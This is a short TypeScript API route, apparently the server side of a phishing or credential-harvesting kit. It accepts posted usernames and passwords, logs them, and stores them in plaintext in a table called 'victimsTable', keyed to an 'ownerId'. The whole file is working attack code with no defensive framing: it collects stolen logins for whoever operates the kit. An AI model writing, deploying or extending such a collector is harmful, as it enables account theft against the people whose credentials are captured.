import { db } from "@/db/db";
import { victimsTable } from "@/db/schema";
import z from "zod";

const detailsSchema = z.object({
  username: z.string().min(3).max(50),
  password: z.string().min(8),
  id: z.string(),
});

export const POST = async (request: Request) => {
  const { username, password, id } = await request.json();
  const data = detailsSchema.safeParse({ username, password, id });
  console.log({ data: data.success ? data.data : data.error.issues });
  if (!data.success) {
    return new Response(JSON.stringify({ error: data.error.issues }), {
      headers: { "Content-Type": "application/json" },
    });
  }
  const result = await db
    .insert(victimsTable)
    .values({ username, password, ownerId: id })
    .returning();

  if (result.length === 0) {
    return new Response(JSON.stringify({ error: "Failed to create victim" }), {
      headers: { "Content-Type": "application/json" },
      status: 500,
    });
  }
  return new Response(JSON.stringify({ message: "Successful" }), {
    headers: { "Content-Type": "application/json" },
  });
};
